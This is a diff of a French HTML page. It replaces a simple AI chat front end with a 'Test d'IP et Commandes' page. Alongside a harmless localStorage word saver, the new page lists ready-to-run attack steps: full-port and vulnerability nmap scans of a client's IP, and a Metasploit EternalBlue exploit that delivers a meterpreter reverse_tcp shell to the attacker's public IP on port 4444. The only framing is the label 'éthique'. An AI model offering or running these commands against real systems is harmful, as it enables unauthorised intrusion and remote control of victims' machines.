@@ -3,195 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chat IA</title>
+    <title>Test d'IP et Commandes</title>
     <style>
-        /* Style général */
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            color: #333;
             margin: 0;
             padding: 0;
-            background: url('https://surflog.com.br/wp-content/uploads/2021/01/background-whatsapp-7.jpg') no-repeat center center fixed;
-            background-size: cover;
-            color: #fff;
             display: flex;
             flex-direction: column;
+            align-items: center;
+            justify-content: center;
             height: 100vh;
-            overflow: hidden;
         }
-
-        /* Conteneur de la discussion */
-        .chat-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            padding: 10px;
-            overflow-y: auto;
-            scrollbar-width: thin;
-            scrollbar-color: rgba(255, 255, 255, 0.5) transparent;
+        h1 {
+            color: #4CAF50;
         }
-
-        .chat-container::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .chat-container::-webkit-scrollbar-thumb {
-            background-color: rgba(255, 255, 255, 0.5);
+        .container {
+            background-color: white;
+            padding: 20px;
             border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 600px;
         }
-
-        /* Message */
-        .message {
-            margin: 5px 0;
-            padding: 10px 15px;
-            border-radius: 15px;
-            max-width: 70%;
-            word-wrap: break-word;
-            color: #000000;
+        .input-section, .commands-section {
+            margin-bottom: 20px;
         }
-
-        .message.user {
-            background-color: rgba(112, 245, 112, 0.7); /* Vert WhatsApp */
-            align-self: flex-end;
-        }
-
-        .message.ia {
-            background-color: rgba(255, 255, 255, 0.7); /* Bleu foncé */
-            align-self: flex-start;
-        }
-
-        /* Zone de saisie */
-        .input-container {
-            display: flex;
+        textarea {
+            width: 100%;
             padding: 10px;
-            background: rgba(0, 0, 0, 0.8);
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        input[type="text"] {
-            flex: 1;
-            padding: 10px;
-            border: none;
+            margin-top: 10px;
             border-radius: 5px;
-            font-size: 1em;
+            border: 1px solid #ddd;
         }
-
         button {
-            margin-left: 10px;
-            padding: 10px 20px;
-            background-color: rgba(0, 128, 0, 0.7);
-            color: #fff;
+            background-color: #4CAF50;
+            color: white;
             border: none;
+            padding: 10px 20px;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 1em;
-            transition: background-color 0.3s ease;
         }
-
         button:hover {
-            background-color: rgba(0, 128, 0, 0.9);
+            background-color: #45a049;
         }
-
-        /* Indicateur de saisie */
-        .typing-indicator {
-            margin: 5px;
-            font-style: italic;
-            color: rgba(255, 255, 255, 0.7);
-            align-self: flex-start;
+        .embed-section {
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="chat-container" id="chat-container">
-        <!-- Les messages et l'indicateur de saisie apparaîtront ici -->
-    </div>
-    <div class="input-container">
-        <input type="text" id="question" placeholder="Écrivez votre message..." />
-        <button id="send-btn">Envoyer</button>
+
+    <div class="container">
+        <h1>Outils de Test d'IP et Commandes</h1>
+        
+        <!-- Section pour récupérer l'adresse IP de la passerelle -->
+        <div class="input-section">
+            <h2>Commande pour récupérer l'adresse IP de la passerelle</h2>
+            <pre>
+                ip route | grep default
+            </pre>
+        </div>
+
+        <!-- Section pour coller un mot et le sauvegarder localement -->
+        <div class="input-section">
+            <h2>Collez un mot à sauvegarder</h2>
+            <textarea id="wordInput" placeholder="Entrez un mot à sauvegarder..."></textarea>
+            <button onclick="saveWord()">Sauvegarder</button>
+            <p id="savedWordDisplay">Mot sauvegardé : <span id="savedWord"></span></p>
+        </div>
+
+        <!-- Section pour afficher des commandes d'attaque (éthique) -->
+        <div class="commands-section">
+            <h2>Commandes pour tester le réseau</h2>
+            <p>Exécuter un scan Nmap :</p>
+            <pre>
+                nmap -p 1-65535 -sV [adresse_ip_du_client]
+            </pre>
+            <p>Exécuter un scan des vulnérabilités :</p>
+            <pre>
+                nmap --script vuln [adresse_ip_du_client]
+            </pre>
+            <p>Exploitation via Metasploit :</p>
+            <pre>
+                msfconsole
+                use exploit/windows/smb/ms17_010_eternalblue
+                set RHOSTS [adresse_ip_du_serveur]
+                set PAYLOAD windows/x64/meterpreter/reverse_tcp
+                set LHOST [votre_ip_publique]
+                set LPORT 4444
+                run
+            </pre>
+        </div>
     </div>
 
     <script>
-        const chatContainer = document.getElementById('chat-container');
-        const questionInput = document.getElementById('question');
-        const sendButton = document.getElementById('send-btn');
-        const botName = "NomDuBot"; // Changez le nom du bot ici
-
-        // Fonction pour ajouter un message à la discussion
-        function addMessage(content, sender) {
-            const messageDiv = document.createElement('div');
-            messageDiv.classList.add('message', sender);
-            messageDiv.textContent = content;
-            chatContainer.appendChild(messageDiv);
-            chatContainer.scrollTop = chatContainer.scrollHeight; // Scroll automatique vers le bas
-        }
-
-        // Fonction pour afficher l'indicateur de saisie
-        function showTypingIndicator() {
-            const typingIndicator = document.createElement('div');
-            typingIndicator.classList.add('typing-indicator');
-            typingIndicator.id = 'typing-indicator';
-            typingIndicator.textContent = `${botName} est en train d'écrire...`;
-            chatContainer.appendChild(typingIndicator);
-            chatContainer.scrollTop = chatContainer.scrollHeight;
-        }
-
-        // Fonction pour masquer l'indicateur de saisie
-        function hideTypingIndicator() {
-            const typingIndicator = document.getElementById('typing-indicator');
-            if (typingIndicator) {
-                chatContainer.removeChild(typingIndicator);
-            }
-        }
-
-        // Événement bouton "Envoyer"
-        sendButton.addEventListener('click', async () => {
-            const question = questionInput.value.trim();
-            if (!question) return;
-
-            // Ajout du message utilisateur
-            addMessage(question, 'user');
-            questionInput.value = '';
-
-            // Affichage de l'indicateur de saisie
-            showTypingIndicator();
-
-            // Simulation d'une latence de 0,5 seconde avant d'afficher la réponse
-            setTimeout(async () => {
-                try {
-                    // Envoi de la requête au serveur
-                    const response = await fetch('http://localhost:6259/ask', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({ question }),
-                    });
-
-                    if (!response.ok) {
-                        throw new Error('Erreur serveur.');
-                    }
-
-                    // Suppression de l'indicateur de saisie
-                    hideTypingIndicator();
-
-                    // Ajout de la réponse de l'IA
-                    const data = await response.text();
-                    addMessage(data, 'ia');
-                } catch (error) {
-                    console.error('Erreur:', error);
-                    hideTypingIndicator();
-                    addMessage("Une erreur est survenue. Veuillez réessayer.", 'ia');
-                }
-            }, 500); // Latence de 0,5 seconde
-        });
-
-        // Permet d'envoyer le message avec la touche Entrée
-        questionInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                sendButton.click();
+        // Charger le mot sauvegardé à partir du localStorage si existant
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedWord = localStorage.getItem('savedWord');
+            if (savedWord) {
+                document.getElementById('savedWord').textContent = savedWord;
             }
         });
-        src="chatbot.js"
+
+        // Sauvegarder le mot dans localStorage
+        function saveWord() {
+            const word = document.getElementById('wordInput').value;
+            localStorage.setItem('savedWord', word);
+            document.getElementById('savedWord').textContent = word;
+        }
     </script>
+
 </body>
 </html>
